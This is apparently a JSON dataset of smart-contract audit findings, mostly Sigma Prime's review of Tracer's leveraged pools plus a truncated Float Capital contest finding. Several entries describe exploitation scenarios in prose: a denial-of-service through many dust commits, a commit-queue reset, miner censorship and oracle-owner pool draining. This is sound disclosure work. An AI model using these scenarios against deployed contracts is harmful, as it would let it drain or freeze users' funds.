      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19701",
      "title": "Miscellaneous Tracer Contract Issues",
      "impact": "LOW",
      "content": "## Description\n\nThis section details miscellaneous findings discovered by the testing team that do not have direct security implications:\n\n1. **Unnecessary Casting:**\n   - `lastPriceTimestamp` in `LeveragedPool.sol` is stored as `uint256` and thus does not need to be cast to `uint40` before automatically being cast back to `uint256`. Noting that it is used in the event `IPoolCommitter.Commit` for the field created as `uint40`.\n   - The line in `uint256 scaler = uint256(10**(MAX_DECIMALS - _decimals));` of `PoolSwapLibrary.fromWad()` does not need explicit casting to `uint256` as all numbers are already of type `uint256`.\n   - `LeveragedPool.payKeeperFromBalances()` performs an unnecessary `uint256` cast of the amount input. Consider removing the `uint256` cast in line [117] of `LeveragedPool.sol`.\n\n2. **Duplicate Modifiers:**\n   - Modifiers `onlyKeeper` and `onlyPoolKeeper` perform the same functionality in `LeveragedPool.sol`. Therefore, one of these modifiers can be safely removed, and all instances of its use can be replaced with the other modifier.\n\n3. **Lack of SPDX Licence Identifier:**\n   - The `IPoolToken.sol` interface contract is missing an SPDX identifier which correctly licenses the contract for open source development.\n\n4. **List of Typos:**\n   - At `PoolCommitter.sol` line [64], line [67], line [70], and line [261], there is a typo in the function comments and the `onlyFactory` revert message. \"commiter\" should be \"committer\" in the first three instances. The `onlyFactory` revert message should be updated to \"Committer: not factory\".\n   - At `PoolFactory.sol` line [116] and line [117], there is a typo in the function comments. \"commiter\" should be \"committer\".\n   - `PoolCommitter.sol` and `LeveragedPool.sol` contracts contain inaccurate title comments. These should be updated to better reflect the segregation of functionality between the two contracts.\n   - By default, `feeReceiver` in `PoolFactory.sol` is a public state variable; however, to be consistent, the testing team recommends adding a specific `public` keyword to line [26].\n   - The revert message in `LeveragedPool.initialize()` line [56-59] does not correctly reflect the fee checks behavior. In its current implementation, a pools fee cannot be initialized to 100%. This is likely intended behavior; therefore, it would be useful to update the revert message to better reflect this. Consider updating the revert message on line [56-59] from \"Fee is greater than 100%\" to \"Fee is greater than or equal to 100%\" or similar.\n\n5. **Lack of Zero Address Validation:**\n   - A number of contracts lack proper zero address validation and therefore may be initialized into an unexpected state. Ensure that contracts `PoolCommitter.sol`, `ChainlinkOracleWrapper.sol`, `PoolFactory.sol`, and `PoolCommitterDeployer.sol` perform proper zero address validation in their constructors.\n\n6. **Use of Default CommitType:**\n   - If an invalid `CommitType` is selected when calling `PoolCommitter.commit()`, `PoolCommitter.commitTypeToUint()` will default to `ShortMint`. This may inhibit overall user experience and should be ideally avoided and replaced with a relevant revert message if an invalid `CommitType` is selected.\n\n7. **Pause Mechanism:**\n   - `LeveragedPool.sol` holds all assets related to open long and short positions and plays a key role in TracerDAOs perpetual pool system. Therefore, it may be useful to have a Pausable mechanism where the only `Gov` role can trigger an emergency stop to all deposits and withdrawals. The OpenZeppelin library contains an implementation of such a mechanism and can be applied by including the `whenNotPaused` and `whenPaused` modifiers to any target function.\n\n8. **Potential Unexpected States:**\n   - `PoolFactory.setMaxLeverage()` should not be settable to 0 as it puts the leveraged pool in a state where pools are no longer able to be deployed via `PoolFactory.deployPool()`. Ensure `maxLeverage` is never set to anything less than 1.\n   - If the initial oracle price queried in `PoolKeeper.newPool()` is <= 0, then keepers will be unable to perform their duties as the upkeep will fail at the following line in `LeveragedPool.executePriceChange()`:\n     ```solidity\n     if (_oldPrice <= 0 || _newPrice <= 0) { emit PriceChangeError(_oldPrice, _newPrice); }\n     ```\n     Users can still mint and burn tokens as expected, but the market itself will become unusable. Consider adding a check in `PoolKeeper.newPool()` that ensures the starting price is a positive value.\n\n9. **Unchecked ERC20 Return Value:**\n   - `PoolCommitter.setQuoteAndPool()` makes an external ERC20 call to `approve()` the pool address as a spender to the `PoolCommitter.sol` contract. Consider checking the return value of this external call.\n\n10. **Keeper Frontrunning:**\n    - The `PoolKeeper.performUpkeepSinglePool()` function is a public and unrestricted function allowing anyone to perform the duties of a keeper and be rewarded for their work. This helps to maintain a high availability network that is able to deal with a large number of leveraged pools. There is potential for keepers to frontrun each other as they compete for blockspace. Ensure this is understood by users wishing to interact with the `PoolKeeper.sol` contract.\n\n11. **Unclear Keeper Payments:**\n    - `LeveragedPool.payKeeperFromBalances()` utilizes `PoolSwapLibrary.getBalancesAfterFees()` to determine the pool balances after the keepers fees have been deducted. The following comment in `PoolSwapLibrary.sol` line [39] specifies that reward may be equal to the sum of the two pool balances:\n      ```solidity\n      @dev Assumes shortBalance + longBalance >= reward\n      ```\n      Consider updating the following check in `payKeeperFromBalances()` or the aforementioned dev comment in `PoolSwapLibrary.sol` to correctly match the intended behavior:\n      ```solidity\n      // If the rewards are more than the balances of the pool, the keeper does not get paid\n      if (amount >= _shortBalance + _longBalance) {\n          return false;\n      }\n      ```\n\n## Recommendations\n\nEnsure that the comments are understood and acknowledged, and consider implementing the suggestions above.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19700",
      "title": "Gas Optimisations",
      "impact": "LOW",
      "content": "## Description\n\n1. **PoolCommitter.sol** may cache the addresses for `poolTokens` so the addresses dont need to be fetched from `LeveragedPool.sol` each time, saving gas on external calls.\n\n2. **PoolCommitter.commitTypeToUint()** may remove the `ShortMint` if-else branch since the default else is zero (0).\n\n3. **PoolKeeper.performUpkeepSinglePool()** makes three separate calls to `LeveragedPool.sol`. Each external call has gas overhead. Consider having a single function which has a tuple of three values as the return. The external calls are `oracleWrapper()`, `updateInterval()`, and `lastPriceTimestamp()`.\n\n4. The number of math operations in **PoolSwapLibrary.getLossMultiplier()** can be reduced to save gas and reduce code complexity. Consider the following code snippet:\n   ```solidity\n   ABDKMathQuad.pow_2(\n       ABDKMathQuad.mul(\n           leverage,\n           ABDKMathQuad.log_2(\n               ABDKMathQuad.add(\n                   ABDKMathQuad.mul(direction < 0 ? one : zero, ratio),\n                   ABDKMathQuad.div(\n                       ABDKMathQuad.mul(direction >= 0 ? one : zero, one), \n                       ratio\n                   )\n               )\n           )\n       )\n   );\n   ```\n   The code can be simplified by moving the ternary operator and removing the multiplications by one. Consider the following code which produces the same output:\n   ```solidity\n   ABDKMathQuad.pow_2(\n       ABDKMathQuad.mul(\n           leverage,\n           ABDKMathQuad.log_2(\n               direction < 0 ? ratio : ABDKMathQuad.div(one, ratio)\n           )\n       )\n   );\n   ```\n\n5. The function **PoolSwapLibrary.calculatePriceChange()** can have the calculations for `totalFeeAmount` simplified.\n   ```solidity\n   uint256 totalFeeAmount = 0;\n   // fee is enforced to be < 1.\n   // Therefore, shortFeeAmount < shortBalance, and longFeeAmount < longBalance\n   shortBalance = shortBalance - shortFeeAmount;\n   totalFeeAmount = totalFeeAmount + shortFeeAmount;\n   longBalance = longBalance - longFeeAmount;\n   totalFeeAmount = totalFeeAmount + longFeeAmount;\n   ```\n   The code calculations may be reduced to the following:\n   ```solidity\n   shortBalance = shortBalance - shortFeeAmount;\n   longBalance = longBalance - longFeeAmount;\n   uint256 totalFeeAmount = shortFeeAmount + longFeeAmount;\n   ```\n\n6. Gas savings by utilizing the solc optimizer in Hardhat config.\n\n7. There are a number of functions which can be declared external, generating gas savings upon contract deployment and on each function call. These functions are:\n   - **PoolSwapLibrary.getBalancesAfterFees()**\n   - **PoolSwapLibrary.calculatePriceChange()**\n   - **PoolCommitter.getCommit()**\n   \n   Consider changing the above functions from `public` to `external`.\n\n8. **LeveragedPool.getOraclePrice()** can be used to consolidate a number of functions in **PoolKeeper.sol**, namely: `newPool()`, `performUpkeepSinglePool()`, and `keeperGas()`. This helps to minimize the number of state reads, saving gas on each function call. If this is intended behavior, then `LeveragedPool.getOraclePrice()` can have its visibility updated from `public` to `external`.\n\n9. `pairTokenBase` and `poolBase` addresses in **PoolFactory.sol** can be declared as `immutable` for potential gas savings as the variable is only read by the contract after being assigned in the constructor().\n\n10. Potential gas savings by avoiding updates to the leveraged pools long and short balances in **LeveragedPool.executePriceChange()**. If there is no change in price, external calls made in this function can be safely avoided.\n\n11. There are potential redundant SLOAD operations in **PoolCommitter.executeAllCommitments()** used to track the `nextEarliestCommitUnexecuted` state variable. `nextEarliestCommitUnexecuted` is always equal to `i` and can therefore be replaced with `i` in line [166].\n\n12. **PoolCommitter.executeAllCommitments()** is performing additional SLOAD operations in the for loop. It may be more gas-efficient to load these into local variables, utilizing the `cheaperMLOAD` opcode.\n\n## Recommendations\n\nGas optimizations are often a trade-off between cost and code simplicity. Review the gas optimizations provided and consider implementing them where appropriate.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19699",
      "title": "Test Coverage Improvements",
      "impact": "LOW",
      "content": "## Description\nAdequate test coverage and regular reporting is an essential process to ensuring the codebase works as intended. Insufficient code coverage may lead to unexpected issues and regressions arising due to changes in the underlying smart contract implementation.\n\n## Recommendations\n- Consider updating the tests for TracerDAOs smart contract suite to include interactions with all code statements and branches.\n- Incorporate regular test coverage reporting into the development workflow. `solidity-coverage` supports Hardhat as of v0.7.12. \n\n[1]: https://github.com/sc-forks/solidity-coverage#hardhat",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19698",
      "title": "Known Issues",
      "impact": "LOW",
      "content": "## Description\n\nThe testing team has identified four (4) issues that have been previously flagged by the TracerDAO team. These include:\n\n- Safe Governance Transfer\n- Keeper Rewards\n- Keeper Gas Price Usage\n- New Keeper Propagation\n\n## Safe Governance\n\nThe current transfer pattern of governance involves calling the function `LeveragedPool.transferGovernance()` which instantly updates the onlyGov role. This allows the current onlyGov account to set any arbitrary address, excluding the zero address.\n\nIf the address is entered incorrectly or set to an unknown address, the onlyGov role is lost forever, preventing several important onlyGov functions from being called. Those functions include `LeveragedPool.setKeeper()` and `LeveragedPool.updateFeeAddress()`.\n\n### Recommendations\n\nThis scenario is typically mitigated by implementing a two stage transferOwnership pattern. A new governance address is selected, then the selected address must call `claimOwnership()` before the owner is changed. This ensures the new owner address is accessible.\n\n## Keeper Rewards\n\nPool keepers are potentially not rewarded for performing an upkeep on a pool if the balance of the pool is insufficiently funded. This may be due to the fact that the pool has recently been deployed or has become inactive over time.\n\nCurrently, there is no way for keepers to check if their call to upkeep a pool will successfully payout a reward without simulating a JSONRPC `eth_call`. This adds additional complexity to a keepers role and should be avoided.\n\n### Recommendations\n\nConsider implementing a view function to enable pool keepers to check a pools balance before proceeding with a pool upkeep.\n\n## Keeper Gas Price Usage\n\nThe `PoolKeeper.sol` contract currently uses a fixed gas pricing model when calculating the amount to pay a keeper for performing an upkeep. There is a leftover TODO in `PoolKeeper.performUpkeepSinglePool()` line [109] which may result in transactions failing in a mainnet environment.\n\n### Recommendations\n\nConsider utilising a gas price oracle or wait for an EIP1559 compliant solution in Solidity.\n\n## New Keeper Propagation\n\nThe `PoolFactory.setPoolKeeper()` function does not propagate to all subsequent pools, making keeper updates complex and costly to perform.\n\n### Recommendations\n\nConsider updating the `PoolFactory.setPoolKeeper()` function to propagate a keeper update to all valid pools in the contract.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19697",
      "title": "onlyGov Role Can Withdraw Users Funds",
      "impact": "LOW",
      "content": "## Description\n\nThe onlyGov role is configured to be the owner of the `thePoolFactory.sol` contract. This gives permissions to update various settings in a leveraged pool. A compromised onlyGov role is able to extract funds from a leveraged pool by firstly setting the `keeper` address to an account in their control using the `setKeeper()` function. They are subsequently able to call `payKeeperFromBalances()` and withdraw any arbitrary amount from the leveraged pool.\n\n## Recommendations\n\nEnsure that the associated risks are clear and well understood. While the testing team understands that the onlyGov role is highly unlikely to be compromised, mitigating any issues related to this event ensures users funds continue to be protected.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19696",
      "title": "Potential MEV Attack When Users Commit",
      "impact": "LOW",
      "content": "## Description\n\nPool keepers play a key role in asserting regular price updates are made to a leveraged pool following the execution of any pending commits. A frontrunning interval exists within the regular update interval such that any commitments made during this frontrunning interval are not executed until the following upkeep.\n\nMiners are able to manipulate `block.timestamp` as long as it satisfies the following properties:\n\n- `block.timestamp` is greater than the parent blocks timestamp.\n- `block.timestamp` is within a 15 second time variance of its parents `block.timestamp`.\n\nUsers intending to enter the pool by minting long or short pool tokens are incentivized to make this decision just before the frontrunning interval starts. This allows them to utilize the latest price data for the asset being tracked by the pool. As a result, it is possible for miners to effectively censor users by increasing `block.timestamp` such that `executeAllCommitments()` skips certain commits and `uncommit()` reverts for other commits.\n\nThis attack is not entirely viable unless there is a drastic short term price movement, resulting in a lagging SMA that is likely to follow the same trend but at a reduced velocity. Therefore, a malicious user could pay a miner to censor certain transactions and have them pushed to the following update interval. As `commit()` transactions are likely to still succeed, miners are able to perform an MEV attack without losing out on any fees that they would normally generate. A scenario where this would be likely could involve a miner censoring any commits related to users on the losing side of the pool. This would effectively delay their commits to exit their long or short positions until the following update interval, potentially generating increased profits for the winning side.\n\n## Recommendations\n\nEnsure that users are aware of MEV threats and advise them to avoid using the `commit()` and `uncommit()` functions when `block.timestamp` is close to the frontrunning interval.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19695",
      "title": "Unnecessary Multiplication by fixedPoint",
      "impact": "LOW",
      "content": "## Description\n\nThe map variable `executionPrice` stores the current execution price as an `int256`, which is fetched from the `ChainlinkOracleWrapper.sol` contract. The price returned by `ChainlinkOracleWrapper` is in WAD (10^18) units.\n\n```solidity\nint256 latestPrice = IOracleWrapper(pool.oracleWrapper()).getPrice();\n```\n\n- Start a new round\n\n```solidity\nint256 lastExecutionPrice = executionPrice[_pool];\nexecutionPrice[_pool] = ABDKMathQuad.toInt(\n    ABDKMathQuad.mul(ABDKMathQuad.fromInt(latestPrice), fixedPoint)\n);\n```\n\nThe snippet above from `performUpkeepSinglePool()` shows the price from `ChainlinkOracleWrapper` is further multiplied by `fixedPoint`, which is `1 * 10^18`, thereby giving `executionPrice` units of `10^36`. The price is only used as a ratio, where we have `latestPrice / lastExecutionPrice` or the inverse. Thus, the additional units will cancel out.\n\nHowever, if the price overflows the `112` bit significand (`5 * 10^33`), some precision will be lost.\n\nA similar issue can be seen in the function `keeperReward()`, where `_tipPercent` is unnecessarily multiplied by `fixedPoint`. Since `_tipPercent` is only stored as a quadruple-precision number and not converted to an integer, it is unnecessary to multiply the value by `fixedPoint`. This is because quadruple-precision representation can already adequately handle the ratios potentially less than one (1) and will not gain additional precision from being a larger value.\n\n```solidity\nbytes16 _tipPercent = ABDKMathQuad.mul(\n    ABDKMathQuad.fromUInt(keeperTip(_savedPreviousUpdatedTimestamp, _poolInterval)),\n    fixedPoint\n);\n```\n\n- Amount of settlement tokens to give to the keeper\n\n```solidity\n_tipPercent = ABDKMathQuad.div(_tipPercent, ABDKMathQuad.fromUInt(100));\n```\n\n```solidity\nint256 wadRewardValue = ABDKMathQuad.toInt(\n    ABDKMathQuad.add(\n        ABDKMathQuad.fromUInt(_keeperGas),\n        ABDKMathQuad.div(ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent), fixedPoint)\n    )\n);\n```\n\n## Recommendations\n\n- Consider removing the multiplication by `fixedPoint` for `executionPrice`.\n- Additionally, consider removing both the multiplication and division of `fixedPoint` from `_tipPercent` and `wadRewardValue`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19694",
      "title": "Ownable Oracle Allowed in ChainlinkOracleWrapper",
      "impact": "LOW",
      "content": "## Description\n\nThe ChainlinkOracleWrapper contract is a wrapper implementation for fetching price feed data, typically from the Chainlink network. Market creators deploy an oracle wrapper contract before deploying a leveraged pool through `PoolFactory.deployPool()`. The wrapper contract contains its own `onlyOwner` role which is delegated to the contract deployer. In most cases, the market creator and the deployer of the oracle wrapper contract will be the same.\n\nThis opens up the potential for a third-party market creator to intentionally manipulate the price of a pools asset by changing the underlying oracle price feed. If users have already taken long and short positions in the leveraged pool, the market creator could take a large position on one side of the pool, manipulate the price, and drain the balance of the pool on the other side.\n\n## Recommendations\n\nEnsure that this is understood by TracerDAOs perpetual pool users. While the testing team understands that initial V1 deployment involves TracerDAO deploying a number of reputable pools using Chainlink oracles as price feeds, users may be unaware of any potential dangers when using markets deployed by third-party entities.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19693",
      "title": "Divide Before Multiply",
      "impact": "LOW",
      "content": "## Description\n\nSolidity is unable to handle floating point numbers and will therefore truncate integers during division. This may result in an unnecessary loss of precision when attempting to execute commitments for minting and burning. Due to the high precision of ether values, this issue is of low severity. \n\nThe following functions are affected by this issue:\n\n- `mintAmount` in `PoolSwapLibrary.getMintAmount()`\n- `amountOut` in `PoolSwapLibrary.getAmountOut()`\n- `keeperReward` in `PoolKeeper.keeperReward()`\n\n## Burn Commitments\n\nAfter `LeveragedPool.executePriceChange(oldPrice, newPrice)` has executed and long and short balances have been updated, certain price inputs create changes to long and short balances that are not favourable for burning commitments. \n\nFor example, assuming an initial long and short balance of 100:\n\n- `LeveragedPool.executePriceChange(1000, 3000)` produces a long balance of `166.66666666666669` and short balance of `33.33333333333333`. \n\nBoth these balances are used when burning to calculate the `amountOut`, and due to division occurring before multiplication we are left with a missing wei in the leveraged pool that cannot be claimed due to rounding.\n\n## Mint Commitments\n\nWhen minting, the `PoolSwapLibrary.getMintAmount()` relies on multiplication of `amountIn * ratio`, where the ratio is `(tokenSupply + inverseShadowBalance) / balance`. Again, a similar imbalance can be obtained by producing interesting `inverseShadowBalance` to balance ratios that lead to floating points. When large floating points occur, losses of a single wei for those mintings may follow.\n\n## Keeper Rewards\n\nThe `keeperReward()` function in the `PoolKeeper.sol` contract also contains another division before multiplication. This can be seen on line [183] and with the result of `_tipPercent`, a division operation, then being used in a subsequent multiplication. Due to the use of fixed points, the impact of this issue is more limited than the previous occurrences described above.\n\n## Recommendations\n\nThe testing team recommends performing all multiplication operations before any division whenever possible.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19691",
      "title": "User Can Reset earliestCommitUnexecuted State Variable",
      "impact": "MEDIUM",
      "content": "## Description\n\nUsers enter and exit their long or short positions by calling `commit()` with the relevant action. These commits are then placed into a queue where the earliest and latest commit IDs are tracked as state variables `earliestCommitUnexecuted` and `latestCommitUnexecuted` respectively. Through nefarious means, a user could put this mechanism in an unexpected state in which `earliestCommitUnexecuted` is reset to 0. If `commitIDCounter` is sufficiently high, this could potentially disable the pool keepers ability to perform upkeeps due to an \"Out of Gas\" error.\n\n## Consider the following attack scenario:\n\n- Alice creates 5 separate commits with IDs 1, 2, 3, 4, and 5.\n- Alice then decides to uncommit commits with IDs 2, 3, and 4.\n- In its current state, `earliestCommitUnexecuted` corresponds to Alices commit of ID 1. Similarly, `latestCommitUnexecuted` corresponds to Alices commit of ID 5.\n- Alice then uncommits her original commit of ID 5, updating `latestCommitUnexecuted` to point to her commit with ID 4.\n- Alice also decides to uncommit her original commit of ID 1, updating `earliestCommitUnexecuted` to point to her commit with ID 2.\n- A nefarious user, Bob, sees these actions and decides he wants to abuse the `PoolCommitter.sol` smart contract.\n- Bob decides to perform an upkeep on the same pool Alice has commits waiting to be executed by calling `PoolKeeper.performUpkeep()`. This resultingly calls `executeAllCommitments()` which iterates through all pending commits, skipping any previously uncommitted or non-existent commits.\n\n```solidity\nif ( _commit . owner == address (0) ) {\n    // Commit deleted (uncommitted) or already executed\n    nextEarliestCommitUnexecuted += 1; // It makes sense to set the next unexecuted to the next number\n    continue ;\n}\n```\n\n- Because `latestCommitUnexecuted` points to an empty commit, the branch found on line [144] is reached, setting the local state variable `nextEarliestCommitUnexecuted` to `latestCommitUnexecuted + 1`.\n- After the upkeep is completed, `earliestCommitUnexecuted` is 5 and `latestCommitUnexecuted` is 4.\n- If no one makes a commit before the next update interval and the process is repeated where Bob performs another upkeep, not only are no commits executed (to be expected when there are no pending commits), but the `executeAllCommitments()` function sets `earliestCommitUnexecuted` to an undefined local state variable, i.e., to 0.\n\n## Recommendations\n\nConsider updating the logic of `_uncommit()` such that this logic bug is avoided. A potential simpler solution could be to remove the local variable `nextEarliestCommitUnexecuted` altogether and instead perform another check at the end of the function to ensure we reached the last commit. The check could be a duplicate of the following:\n\n```solidity\nif (i == latestCommitUnexecuted) {\n    // We have reached the last one\n    earliestCommitUnexecuted = NO_COMMITS_REMAINING;\n    return ;\n}\n```\n\nFortunately, commits are deleted after being executed, so resetting `earliestCommitUnexecuted` does not pose any concern for double minting/burning tokens. However, this could add additional gas costs to the keeper for which they are compensated. Therefore, keepers are incentivized to also abuse this bug in order to earn increased payouts for their upkeeps.",
      "summary": "\nThis bug report is about a potential issue with the PoolCommitter.sol smart contract. It is possible for a user to put the mechanism in an unexpected state in which earliestCommitUnexecuted is reset to 0, which could potentially disable the pool keepers ability to perform upkeeps due to an \"Out of Gas\" error. \n\nThe bug is caused by a user, Alice, uncommitting her original commit of ID 1, which updates earliestCommitUnexecuted to point to her commit with ID 2. A nefarious user, Bob, then sees this action and decides to perform an upkeep on the same pool Alice has commits waiting to be executed. This results in earliestCommitUnexecuted being set to 0. \n\nThe recommendation is to update the logic of _uncommit() to avoid this bug. A potential simpler solution is to remove the local variable nextEarliestCommitUnexecuted all together and instead perform another check at the end of the function to ensure the last commit was reached. Fortunately, commits are deleted after being executed, so resetting earliestCommitUnexecuted does not pose any concern for double minting/burning tokens. However, this could add additional gas costs to the keeper for which they are compensated for.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "19690",
      "title": "Denial-of-Service Attack on Leveraged Pool via Multiple Commits",
      "impact": "HIGH",
      "content": "## Description\n\nDue to the iterative nature of how commits are executed, a malicious user is able to dilute the queue of pending commits and effectively prevent a pool keeper from performing its duties. This is made possible by the lack of a minimum commit amount and an unbounded commit queue.\n\nThe `PoolCommitter.sol` contract contains the functionality to enable users to interact with their leveraged pool of choice by depositing and withdrawing their tokens. To do this, users will commit to an action by taking a position consisting of one of the following types: **LongMint**, **LongBurn**, **ShortMint**, or **ShortBurn**.\n\nThe `commit()` function checks that the amount to be committed is a positive amount and proceeds to add the commit to a queue of pending commits. This check is found on line [40] of `PoolCommitter.sol`:\n\n```solidity\nrequire(amount > 0, \"Amount must not be zero\");\n```\n\nPending commits are executed by the pool keeper on each eligible update interval by use of the `PoolKeeper.performUpkeepSinglePool()` function. It is possible for a malicious user to create multiple commits containing small amounts that satisfy the aforementioned check, thereby diluting the queue of pending commits. As a result, a pool keeper may be unable to perform an upkeep within the given block gas limit, ergo preventing all pool deposits and withdrawals.\n\n## Recommendations\n\nConsider enforcing an implementation of these two strategies:\n\n- A minimum commit size for all deposits and withdrawals required by the `commit()` function.\n- A maximum number of commits that can be executed in a given update interval. This can be applied by bounding the iterative `executeAllCommitments()` function to a maximum size, or by restricting the number of commits that can be made through the `commit()` function. Although, the latter option lacks frontrunning protection for users.\n\nNote that the values for these two strategies need to be chosen such that the cost of a potential attack would be prohibitive.",
      "summary": "\nA malicious user is able to dilute the queue of pending commits in the PoolCommitter.sol contract, which is used to enable users to interact with their leveraged pool of choice by depositing and withdrawing their tokens. This is possible due to the lack of a minimum commit amount and an unbounded commit queue. This can prevent a pool keeper from performing its duties, as it may be unable to perform an upkeep within the given block gas limit.\n\nTo prevent this from happening, two strategies should be implemented. Firstly, a minimum commit size for all deposits and withdrawals should be required by the commit() function. Secondly, a maximum number of commits that can be executed in a given update interval should be enforced, either by bounding the iterative executeAllCommitments() function to a maximum size, or by restricting the number of commits that can be made through the commit() function. Note that the values for these two strategies need to be chosen such that the cost of a potential attack would be prohibitive.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/sigp/public-audits/blob/master/tracer/tracer-2/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "25535",
      "title": "[M-06] Prevent markets getting stuck when prices don't move",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon, also found by cmichel_\n\nSuppose there is a synthetic token where the price stays constant, for example:\n- synthetic DAI  (with a payment token of DAI the price will not move)\n- binary option token (for example tracking the USA elections; after the election results there will be no more price movements)\n\nIn that case `assetPriceHasChanged` will never be true (again) and `marketUpdateIndex[marketIndex]` will never increase.\nThis means the `_executeOutstandingNextPrice`* functions will never be executed, which means the market effectively will be stuck.\n\n[`LongShort.sol` L669](https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L669)\n```solidity\nfunction `_updateSystemStateInternal`(uint32 marketIndex) internal virtual requireMarketExists(marketIndex) {\n  ...\n  int256 newAssetPrice = IOracleManager(oracleManagers[marketIndex]).updatePrice();\n  int256 oldAssetPrice = int256(assetPrice[marketIndex]);\n  bool assetPriceHasChanged = oldAssetPrice != newAssetPrice;\n\n  if (assetPriceHasChanged || msg.sender == staker) {\n    ....\n    if (!assetPriceHasChanged) {\n      return;\n    }\n    ....\n    marketUpdateIndex[marketIndex] += 1;  // never reaches this point if the price doesn't change\n\n// https://github.com/code-423n4/2021-08-floatcapital/blob/main/contracts/contracts/LongShort.sol#L1035\nfunction _executeOutstandingNextPriceSettlements(address user, uint32 marketIndex) internal virtual {\n  uint256 userCurrentUpdateIndex = userNextPrice_currentUpdateIndex[marketIndex][user];\n  if (userCurrentUpdateIndex != 0 && userCurrentUpdateIndex <= marketUpdateIndex[marketIndex]) { // needs marketUpdateIndex[marketIndex] to be increased\n    _executeOutstandingNextPriceMints(marketIndex, user, true);\n    _executeOutstandingNextPriceMints(marketIndex, user, false);\n    _executeOutstandingNextPriceRedeems(marketIndex, user, true);\n    _executeOutstandingNextPriceRedeems(marketIndex, user, false);\n    _executeOutstandingNextPriceTokenShifts(marketIndex, user, true);\n    _executeOutstandingNextPriceTokenShifts(marketIndex, user, false);\n```\n\nRecommend enhancing `_updateSystemStateInternal` so that after a certain period of time without price movements (for example 1 day), the entire function is executed (including the `marketUpdateIndex[marketIndex]` += 1;)\n\n**[JasoonS (Float) disputed](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16#issuecomment-896069784):**\n > Good point, we thought the time since last update check wasn't necessary.\n>\n> I'll chat with the team about what they think the risk is. But I don't think it is 3 given that we don't plan to launch any assets that don't have regular change (so market would be stuck for a limited time - even if it is long).\n>\n> In a lot of ways our 'nextPriceExecution` model is designed for this case. Some more traditional markets close for the weekend and over night. Our mechanism means that users will be able to buy and trade these assets at any time and get the asset as soon as there is an update.\n\n**[JasoonS (Float) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16#issuecomment-896290768):**\n > The more I think about this the more I think it is a safety feature. It is way more likely that if the oracle keeps returning the same value that something is broken (which means we can catch the issue before it negatively impacts the system by unfairly managing user funds or similar). If it really is stuck on the same value legitimately it can replace the OracleManager that is being used to help with that.\n\n**[moose-code (Float) commented](https://github.com/code-423n4/2021-08-floatcapital-findings/issues/16#issuecomment-896735385):**\n > Since there is no current plan for a binary market, and the system would definitely need other accommodations to allow a binary market, since next price execution etc, this doesn't make sense as an issue in this case. The system is built for markets where continuous price updates will occur.\n>\n> Agree with Jason, if 